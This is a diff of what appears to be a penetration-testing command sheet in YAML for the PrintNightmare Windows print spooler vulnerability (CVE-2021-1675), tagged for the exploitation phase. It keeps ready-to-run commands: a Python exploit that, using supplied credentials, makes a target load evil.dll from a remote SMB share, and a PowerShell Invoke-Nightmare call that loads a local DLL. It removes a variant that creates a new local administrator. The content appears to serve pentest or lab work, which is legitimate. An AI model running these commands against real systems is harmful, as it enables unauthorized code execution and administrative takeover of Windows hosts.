@@ -20,13 +20,8 @@ commands:
       python3 printnightmare.py -u sec_user -p 'P@ssw0rd' -d senshu.sh 10.10.10.27 '\\10.10.10.21\share\evil.dll'
   - have: Shell
     cmd: |
-      # PowerShell exploit from inside the network
       Import-Module .\CVE-2021-1675.ps1
       Invoke-Nightmare -DLL "C:\Temp\evil.dll"
-
-      # Add a new local admin user via PrintNightmare
-      Import-Module .\CVE-2021-1675.ps1
-      Invoke-Nightmare -DriverName "Senshu" -NewUser "sec_user" -NewPassword "P@ssw0rd"
 phase:
   - Exploitation
 target_os:
